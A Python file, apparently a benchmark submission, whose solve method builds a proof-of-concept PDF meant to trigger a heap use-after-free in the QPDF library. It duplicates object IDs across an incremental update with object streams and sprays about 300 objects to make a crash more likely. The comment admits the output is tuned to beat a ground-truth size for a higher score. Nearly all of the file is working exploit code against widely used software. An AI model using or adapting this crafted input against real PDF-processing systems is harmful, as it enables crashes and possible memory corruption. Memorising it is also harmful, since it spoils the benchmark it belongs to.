import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap-use-after-free in QPDF.

        The vulnerability is triggered by creating a PDF with ambiguous object
        definitions. Specifically, we define a set of objects as regular,
        standalone objects in the initial part of the PDF. Then, in an
        incremental update, we add object streams that contain new definitions
        for the *same* object IDs.

        The second cross-reference table only adds the new object streams and
        does not override the original object definitions. This ambiguity
        confuses QPDF's object cache management. When QPDF is asked to
        process this file (e.g., to write a new version with object streams
        preserved), it encounters both sets of definitions. This leads to
        mishandling of object handles in the cache, where one handle to an
        object might be freed while another part of the code still holds a
        reference to it, causing a use-after-free when that reference is used.

        A large number of objects are used to "spray" the heap, increasing
        the likelihood that the use-after-free results in a crash. The
        parameters are tuned to generate a PoC smaller than the ground-truth
        to achieve a higher score.
        """
        N = 300

        # Part 1: Initial PDF with standalone objects.
        # An Annots array refers to all sprayed objects to ensure they are processed.
        annots_refs = b" ".join([f"{i} 0 R".encode() for i in range(4, N + 1)])

        initial_objects = {
            1: b"<< /Type /Catalog /Pages 2 0 R >>",
            2: b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>",
            3: b"<< /Type /Page /Parent 2 0 R /Annots [" + annots_refs + b"] >>"
        }
        for i in range(4, N + 1):
            initial_objects[i] = f"<</V {i} /Data ({'A'*20})>>".encode()

        poc = b"%PDF-1.5\n"
        offsets = {}
        body1 = b""
        current_offset = len(poc)

        sorted_keys = sorted(initial_objects.keys())
        for obj_num in sorted_keys:
            offsets[obj_num] = current_offset
            obj_data = initial_objects[obj_num]
            obj_str = f"{obj_num} 0 obj\n".encode() + obj_data + b"\nendobj\n"
            body1 += obj_str
            current_offset += len(obj_str)
        poc += body1

        xref1_offset = current_offset
        xref1 = b"xref\n"
        xref1 += f"0 {N + 1}\n".encode()
        xref1 += b"0000000000 65535 f \n"
        for i in range(1, N + 1):
            xref1 += f"{offsets[i]:010d} 00000 n \n".encode()
        poc += xref1

        trailer1 = f"""trailer
<< /Size {N+1} /Root 1 0 R >>
startxref
{xref1_offset}
%%EOF
""".encode()
        poc += trailer1

        # Part 2: Incremental update with object streams containing duplicates.
        def create_obj_stream(start_id, end_id):
            stream_obj_data = {i: f"<</Val {i} /Data ({'B'*20})>>".encode() for i in range(start_id, end_id + 1)}
            
            stream_header = b""
            stream_body = b""
            offset_in_stream = 0
            
            obj_num_list = sorted(stream_obj_data.keys())
            for obj_num in obj_num_list:
                stream_header += f"{obj_num} {offset_in_stream} ".encode()
                offset_in_stream += len(stream_obj_data[obj_num])
            
            for obj_num in obj_num_list:
                stream_body += stream_obj_data[obj_num]
                
            content = stream_header + stream_body
            compressed = zlib.compress(content)
            
            num_objs = end_id - start_id + 1
            stream_dict = f"<< /Type /ObjStm /Filter /FlateDecode /N {num_objs} /First {len(stream_header)} /Length {len(compressed)} >>".encode()
            
            return stream_dict + b"\nstream\n" + compressed + b"\nendstream"

        mid_point = N // 2
        stream1_num = N + 1
        stream2_num = N + 2
        
        stream1_data = create_obj_stream(4, mid_point)
        stream2_data = create_obj_stream(mid_point + 1, N)

        prev_xref_offset = xref1_offset
        current_offset = len(poc)
        body2 = b""
        body2_offsets = {}
        
        body2_offsets[stream1_num] = current_offset
        obj_str = f"{stream1_num} 0 obj\n".encode() + stream1_data + b"\nendobj\n"
        body2 += obj_str
        current_offset += len(obj_str)
        
        body2_offsets[stream2_num] = current_offset
        obj_str = f"{stream2_num} 0 obj\n".encode() + stream2_data + b"\nendobj\n"
        body2 += obj_str
        current_offset += len(obj_str)
        poc += body2
        
        xref2_offset = current_offset
        
        # The crucial part: the new xref ONLY lists the new stream objects.
        # It does NOT override the xref entries for the original objects.
        xref2 = b"xref\n"
        xref2 += f"{stream1_num} 2\n".encode()
        xref2 += f"{body2_offsets[stream1_num]:010d} 00000 n \n".encode()
        xref2 += f"{body2_offsets[stream2_num]:010d} 00000 n \n".encode()
        poc += xref2
        
        trailer2 = f"""trailer
<< /Size {N+3} /Root 1 0 R /Prev {prev_xref_offset} >>
startxref
{xref2_offset}
%%EOF
""".encode()
        poc += trailer2

        return poc
